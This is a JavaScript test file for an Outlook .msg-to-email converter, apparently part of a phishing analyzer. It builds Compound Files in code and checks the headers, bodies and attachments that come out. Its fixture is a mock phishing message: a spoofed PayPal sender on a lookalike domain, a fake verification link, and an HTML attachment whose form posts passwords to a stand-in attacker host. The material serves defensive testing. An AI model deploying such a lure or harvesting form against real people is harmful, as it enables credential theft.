// Outlook .msg files: the Compound File reader and the conversion to RFC 822.
// Run: node tests/msg.test.mjs
//
// The .msg files are built here by an independent Compound File writer that
// follows [MS-CFB] — small streams in the mini stream, large ones in regular
// sectors — so both storage paths are exercised.

import assert from "node:assert/strict";
import { existsSync, readFileSync } from "node:fs";
import { msgToEml, isMsgFile, readCompoundFile } from "../scripts/msg-parser.js";
import { parseHeaders } from "../scripts/parse-headers.js";
import { parseBody } from "../scripts/parse-body.js";

let passed = 0;
const failures = [];
function test(name, fn) {
  try {
    fn();
    passed++;
  } catch (e) {
    failures.push({ name, message: e.message });
  }
}

// ===== a Compound File writer =====

const SECTOR = 512;
const MINI = 64;
const CUTOFF = 4096;
const FREE = 0xffffffff;
const END = 0xfffffffe;
const FATSECT = 0xfffffffd;

/**
 * Build a Compound File. `tree` is { name: Uint8Array | subtree }.
 * Siblings are linked as a right-leaning chain — a valid (if unbalanced) tree.
 */
function writeCfb(tree) {
  const entries = [{ name: "Root Entry", type: 5, child: FREE, right: FREE, data: null }];
  const add = (node) => {
    let first = FREE;
    let prev = null;
    for (const [name, value] of Object.entries(node)) {
      const e = { name, type: value instanceof Uint8Array ? 2 : 1, child: FREE, right: FREE, data: value instanceof Uint8Array ? value : null };
      const id = entries.push(e) - 1;
      if (prev) prev.right = id;
      else first = id;
      prev = e;
      if (e.type === 1) e.child = add(value);
    }
    return first;
  };
  entries[0].child = add(tree);

  // Mini stream for small streams.
  const miniFat = [];
  const miniChunks = [];
  for (const e of entries) {
    if (e.type !== 2 || e.data.length >= CUTOFF) continue;
    const n = Math.max(1, Math.ceil(e.data.length / MINI));
    e.start = e.data.length ? miniFat.length : END;
    for (let i = 0; i < n; i++) miniFat.push(i === n - 1 ? END : miniFat.length + 1);
    const padded = new Uint8Array(n * MINI);
    padded.set(e.data);
    miniChunks.push(padded);
  }
  const miniStream = concat(miniChunks);

  // Sector plan: FAT | directory | mini FAT | mini stream | large streams.
  const dirSectors = Math.ceil((entries.length * 128) / SECTOR);
  const miniFatSectors = Math.ceil((miniFat.length * 4) / SECTOR);
  const miniStreamSectors = Math.ceil(miniStream.length / SECTOR);
  const large = entries.filter((e) => e.type === 2 && e.data.length >= CUTOFF);
  const largeSectors = large.reduce((n, e) => n + Math.ceil(e.data.length / SECTOR), 0);
  let fatSectors = 1;
  while (fatSectors * 128 < fatSectors + dirSectors + miniFatSectors + miniStreamSectors + largeSectors) fatSectors++;

  const fat = [];
  const run = (count) => {
    const start = fat.length;
    for (let i = 0; i < count; i++) fat.push(i === count - 1 ? END : fat.length + 1);
    return count ? start : END;
  };
  for (let i = 0; i < fatSectors; i++) fat.push(FATSECT);
  const dirStart = run(dirSectors);
  const miniFatStart = run(miniFatSectors);
  entries[0].start = run(miniStreamSectors);
  entries[0].size = miniStream.length;
  for (const e of large) e.start = run(Math.ceil(e.data.length / SECTOR));
  while (fat.length % 128) fat.push(FREE);

  const header = new DataView(new ArrayBuffer(SECTOR));
  [0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1].forEach((b, i) => header.setUint8(i, b));
  header.setUint16(0x18, 0x3e, true);
  header.setUint16(0x1a, 3, true);
  header.setUint16(0x1c, 0xfffe, true);
  header.setUint16(0x1e, 9, true);
  header.setUint16(0x20, 6, true);
  header.setUint32(0x2c, fatSectors, true);
  header.setUint32(0x30, dirStart, true);
  header.setUint32(0x38, CUTOFF, true);
  header.setUint32(0x3c, miniFatSectors ? miniFatStart : END, true);
  header.setUint32(0x40, miniFatSectors, true);
  header.setUint32(0x44, END, true);
  for (let i = 0; i < 109; i++) header.setUint32(0x4c + i * 4, i < fatSectors ? i : FREE, true);

  const u32s = (list, sectors) => {
    const v = new DataView(new ArrayBuffer(sectors * SECTOR));
    for (let i = 0; i < sectors * 128; i++) v.setUint32(i * 4, i < list.length ? list[i] : FREE, true);
    return new Uint8Array(v.buffer);
  };
  const dir = new DataView(new ArrayBuffer(dirSectors * SECTOR));
  entries.forEach((e, n) => {
    const at = n * 128;
    for (let i = 0; i < e.name.length; i++) dir.setUint16(at + i * 2, e.name.charCodeAt(i), true);
    dir.setUint16(at + 0x40, (e.name.length + 1) * 2, true);
    dir.setUint8(at + 0x42, e.type);
    dir.setUint8(at + 0x43, 1);
    dir.setUint32(at + 0x44, FREE, true);
    dir.setUint32(at + 0x48, e.right, true);
    dir.setUint32(at + 0x4c, e.child, true);
    dir.setUint32(at + 0x74, e.type === 1 ? 0 : e.start ?? END, true);
    dir.setUint32(at + 0x78, e.type === 5 ? e.size : e.type === 2 ? e.data.length : 0, true);
  });
  for (let n = entries.length; n < dirSectors * 4; n++) {
    dir.setUint32(n * 128 + 0x44, FREE, true);
    dir.setUint32(n * 128 + 0x48, FREE, true);
    dir.setUint32(n * 128 + 0x4c, FREE, true);
  }
  const pad = (b) => {
    const out = new Uint8Array(Math.ceil(b.length / SECTOR) * SECTOR);
    out.set(b);
    return out;
  };
  return concat([
    new Uint8Array(header.buffer),
    u32s(fat, fatSectors),
    new Uint8Array(dir.buffer),
    u32s(miniFat, miniFatSectors),
    pad(miniStream),
    ...large.map((e) => pad(e.data)),
  ]);
}

function concat(parts) {
  const out = new Uint8Array(parts.reduce((n, p) => n + p.length, 0));
  let at = 0;
  for (const p of parts) {
    out.set(p, at);
    at += p.length;
  }
  return out;
}

// ===== MAPI property helpers =====

const unicode = (s) => {
  const out = new Uint8Array(s.length * 2);
  for (let i = 0; i < s.length; i++) {
    out[i * 2] = s.charCodeAt(i) & 0xff;
    out[i * 2 + 1] = s.charCodeAt(i) >> 8;
  }
  return out;
};
const str = (id, s) => [`__substg1.0_${id}001F`, unicode(s)];
const bin = (id, b) => [`__substg1.0_${id}0102`, b];

/** The fixed-size property stream: header, then 16-byte entries. */
function fixedProps(headerSize, list) {
  const v = new DataView(new ArrayBuffer(headerSize + list.length * 16));
  list.forEach(([tag, value], i) => {
    const at = headerSize + i * 16;
    v.setUint32(at, tag, true);
    v.setUint32(at + 4, 6, true);
    if (value instanceof Date) {
      const ticks = BigInt(value.getTime() + 11644473600000) * 10000n;
      v.setBigUint64(at + 8, ticks, true);
    } else v.setInt32(at + 8, value, true);
  });
  return new Uint8Array(v.buffer);
}

const HTML_ATTACHMENT = new TextEncoder().encode(
  `<html><body><form action="https://collect.evil.test/p" method="post"><input type="password" name="p"></form>${"<!-- padding -->".repeat(400)}</body></html>`,
);
const SMALL = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 1, 2, 3, 4]);

const transportHeaders = [
  "Received: from mail.evil.test (mail.evil.test [203.0.113.9]) by mx.example.com; Mon, 5 Oct 2026 09:00:00 +0000",
  "Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=evil.test; dkim=none; dmarc=fail header.from=paypa1.com",
  "From: PayPal <service@paypa1.com>",
  "To: victim@example.com",
  "Subject: Your account is limited",
  "Date: Mon, 5 Oct 2026 09:00:00 +0000",
  "Message-ID: <x1@evil.test>",
  "MIME-Version: 1.0",
  'Content-Type: multipart/related;\r\n\tboundary="original-boundary"',
  "",
].join("\r\n");

function sampleMsg({ headers = true } = {}) {
  return writeCfb(
    Object.fromEntries([
      ["__properties_version1.0", fixedProps(32, [[0x3fde0003, 65001], [0x00390040, new Date("2026-10-05T09:00:00Z")]])],
      ...(headers ? [str("007D", transportHeaders)] : []),
      str("0037", "Your account is limited — ünïcode"),
      str("1000", "Please verify your account at https://paypa1-verify.test/login"),
      bin("1013", new TextEncoder().encode('<p>Please <a href="https://paypa1-verify.test/login">verify</a> — ünïcode</p>')),
      str("0C1A", "PayPal Service"),
      str("5D01", "service@paypa1.com"),
      ["__recip_version1.0_#00000000", Object.fromEntries([str("3001", "Victim"), str("39FE", "victim@example.com")])],
      [
        "__attach_version1.0_#00000000",
        Object.fromEntries([["__properties_version1.0", fixedProps(8, [])], str("3707", "Account review.html"), str("370E", "text/html"), bin("3701", HTML_ATTACHMENT)]),
      ],
      [
        "__attach_version1.0_#00000001",
        Object.fromEntries([str("3707", "logo.png"), str("370E", "image/png"), str("3712", "logo@1"), bin("3701", SMALL)]),
      ],
      [
        "__attach_version1.0_#00000002",
        Object.fromEntries([
          str("3707", "Forwarded.msg"),
          [
            "__substg1.0_3701000D",
            Object.fromEntries([["__properties_version1.0", fixedProps(24, [])], str("0037", "The original message"), str("1000", "inner body"), str("5D01", "boss@corp.test")]),
          ],
        ]),
      ],
    ]),
  );
}

// ===== tests =====

test("the writer's file is recognised and its tree read back", () => {
  const bytes = sampleMsg();
  assert.ok(isMsgFile(bytes));
  assert.ok(!isMsgFile(new TextEncoder().encode("From: a@b.test\r\n\r\nhi")));
  const cfb = readCompoundFile(bytes);
  const names = cfb.childrenOf(cfb.root).map((e) => e.name);
  assert.ok(names.includes("__substg1.0_0037001F"));
  assert.ok(names.includes("__attach_version1.0_#00000000"));
});

test("a .msg becomes a message the analyzer reads: original headers, bodies, attachments", () => {
  const eml = msgToEml(sampleMsg());
  const headers = parseHeaders(eml);
  assert.equal(headers.from.email, "service@paypa1.com");
  assert.match([].concat(headers.all["authentication-results"]).join(), /spf=fail/);
  assert.ok(!eml.includes("original-boundary"), "the original Content-Type is replaced, folded line and all");

  const body = parseBody(eml);
  assert.match(body.text, /paypa1-verify\.test\/login/);
  assert.match(body.html, /ünïcode/, "HTML decoded with the message's code page (UTF-8)");
  const byName = Object.fromEntries(body.attachments.map((a) => [a.filename, a]));
  assert.deepEqual([...byName["Account review.html"].bytes], [...HTML_ATTACHMENT], "large attachment (regular sectors) byte-exact");
  assert.deepEqual([...byName["logo.png"].bytes], [...SMALL], "small attachment (mini stream) byte-exact");
  assert.equal(byName["logo.png"].contentId, "logo@1");
  assert.equal(byName["logo.png"].inline, true);
});

test("an attached Outlook item becomes an attached email", () => {
  const body = parseBody(msgToEml(sampleMsg()));
  const inner = body.attachments.find((a) => a.filename === "Forwarded.eml");
  assert.ok(inner, body.attachments.map((a) => a.filename).join());
  assert.equal(inner.contentType, "message/rfc822");
  const text = new TextDecoder().decode(inner.bytes);
  assert.match(text, /Subject: The original message/);
  assert.match(parseBody(text).text, /inner body/);
});

test("without Internet headers, the headers are rebuilt from the properties", () => {
  const eml = msgToEml(sampleMsg({ headers: false }));
  const headers = parseHeaders(eml);
  assert.equal(headers.from.email, "service@paypa1.com");
  assert.match(eml, /^To: "Victim" <victim@example\.com>$/m);
  assert.match(eml, /^Date: Mon, 05 Oct 2026 09:00:00 \+0000$/m);
  assert.match(eml, /^Subject: =\?UTF-8\?B\?/m, "non-ASCII subject encoded");
  assert.match(eml, /X-Converted-From/);
});

test("a damaged or foreign file fails with a clear message, never hangs", () => {
  assert.throws(() => msgToEml(new TextEncoder().encode("not a msg".repeat(100))), /Not an Outlook \.msg/);
  const truncated = sampleMsg().slice(0, 1500);
  try {
    msgToEml(truncated);
  } catch (e) {
    assert.ok(e instanceof Error);
  }
});

// A real file saved by Outlook, when one is available locally (not in CI).
const REAL = process.env.REAL_MSG;
if (REAL && existsSync(REAL)) {
  test("a real Outlook .msg converts", () => {
    const eml = msgToEml(new Uint8Array(readFileSync(REAL)));
    const body = parseBody(eml);
    console.log("  real .msg:", parseHeaders(eml).subject, "|", body.attachments.map((a) => `${a.filename} (${a.size})`).join(", "), "| links:", body.links.length);
    assert.ok(body.text || body.html);
  });
}

console.log(`\n${passed} passed, ${failures.length} failed`);
for (const f of failures) console.error(`  FAIL  ${f.name}\n        ${f.message}`);
process.exit(failures.length ? 1 : 0);
